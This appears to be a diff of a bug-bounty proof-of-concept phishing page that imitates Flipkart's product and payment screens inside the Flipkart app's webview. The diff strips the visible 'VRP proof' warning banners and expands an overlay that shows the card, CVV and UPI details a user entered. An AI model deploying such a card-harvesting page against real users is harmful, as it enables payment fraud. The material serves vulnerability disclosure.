@@ -258,17 +258,6 @@ html,body{width:100%;overflow-x:hidden;font-family:'Roboto',Arial,sans-serif;bac
     <div class="spec-row" style="border-bottom:none"><span class="spec-key">Color</span><span class="spec-val">Midnight Black</span></div>
   </div>
 
-  <!-- VRP proof -->
-  <div class="proof-banner">
-    <div class="proof-icon">⚠️</div>
-    <div class="proof-text">
-      <strong>FK2 VRP — Domain Spoofing PoC</strong>
-      This page is served from an attacker domain yet opens inside Flipkart's app with NO URL bar.
-      <div class="proof-url">https://ankitkanojiy.github.io/fk2_poc.html</div>
-    </div>
-  </div>
-  <div class="footer">FK2 Security Research · ankikanojiya27@gmail.com</div>
-
   <!-- Sticky buy/cart buttons -->
   <div class="sticky-bottom">
     <button class="btn-cart">🛒 ADD TO CART</button>
@@ -397,30 +386,24 @@ html,body{width:100%;overflow-x:hidden;font-family:'Roboto',Arial,sans-serif;bac
     </div>
   </div>
 
-  <!-- VRP proof -->
-  <div class="proof-banner">
-    <div class="proof-icon">⚠️</div>
-    <div class="proof-text">
-      <strong>FK2 VRP — Payment Page Phishing</strong>
-      Card details entered here go to attacker. No URL bar visible in Flipkart app.
-      <div class="proof-url">https://ankitkanojiy.github.io/fk2_poc.html</div>
-    </div>
-  </div>
-  <div class="footer">FK2 Security Research · ankikanojiya27@gmail.com</div>
 
 </div><!-- end paymentPage -->
 
 <!-- Capture overlay -->
 <div class="overlay" id="overlay">
   <div class="alert-card">
-    <div class="alert-head">🚨 FK2 PoC — Data Captured</div>
+    <div class="alert-head" style="background:#b71c1c">🚨 FK2 VRP — Payment Data Captured</div>
     <div class="alert-body">
-      <p>Running inside <strong>Flipkart's app</strong> — user sees no URL bar, no domain, no warning.</p>
+      <p style="margin-bottom:8px">The user believed they were on <strong>flipkart.com</strong>. No URL bar was shown inside Flipkart's app. The actual page origin:</p>
+      <div class="cred-box" style="background:#0d1117;color:#00e676;font-size:10.5px;margin-bottom:10px">Page URL: ankitkanojiy.github.io/test_page/fk2_poc.html
+Appeared as: flipkart.com (no URL bar in app)
+Loaded via: Flipkart HomeFragmentHolderActivity
+Vector: ACTION_KEY → webView.postUrl() → no domain check</div>
       <div class="cred-box" id="credBox">—</div>
-      <p class="alert-note">Real attack: silent <code>fetch()</code> to attacker server — user's payment/card data exfiltrated with zero indication this page is not flipkart.com.</p>
+      <p class="alert-note">Real attack: silent <code>fetch()</code> exfiltrates payment data to attacker server. User has zero indication this is not Flipkart's own payment page.</p>
     </div>
     <div class="alert-foot">
-      <button class="btn-dismiss" onclick="document.getElementById('overlay').classList.remove('show')">Close</button>
+      <button class="btn-dismiss" onclick="document.getElementById('overlay').classList.remove('show')">Close — FK2 VRP Demo</button>
     </div>
   </div>
 </div>
@@ -497,7 +480,7 @@ function captureCard(){
     'CVV      : <b>'+esc(cvv)+'</b>\n'+
     'Name     : <b>'+esc(name)+'</b>\n'+
     'Amount   : <b>₹50,000</b>\n'+
-    'Domain   : <b>ankitkanojiy.github.io</b>\n'+
+    'Domain   : <b>ankitkanojiy.github.io/test_page/fk2_poc.html</b>\n'+
     'Loaded via: <b>Flipkart HomeFragmentHolderActivity</b>'
   );
 }
@@ -508,7 +491,7 @@ function captureUpi(app){
     'App      : <b>'+esc(app)+'</b>\n'+
     'UPI ID   : <b>'+(id?esc(id):'(app selected)')+'</b>\n'+
     'Amount   : <b>₹50,000</b>\n'+
-    'Domain   : <b>ankitkanojiy.github.io</b>\n'+
+    'Domain   : <b>ankitkanojiy.github.io/test_page/fk2_poc.html</b>\n'+
     'Loaded via: <b>Flipkart HomeFragmentHolderActivity</b>'
   );
 }
@@ -517,7 +500,7 @@ function captureNB(bank){
   showOverlay(
     'Bank     : <b>'+esc(bank)+'</b>\n'+
     'Amount   : <b>₹50,000</b>\n'+
-    'Domain   : <b>ankitkanojiy.github.io</b>\n'+
+    'Domain   : <b>ankitkanojiy.github.io/test_page/fk2_poc.html</b>\n'+
     'Loaded via: <b>Flipkart HomeFragmentHolderActivity</b>'
   );
 }
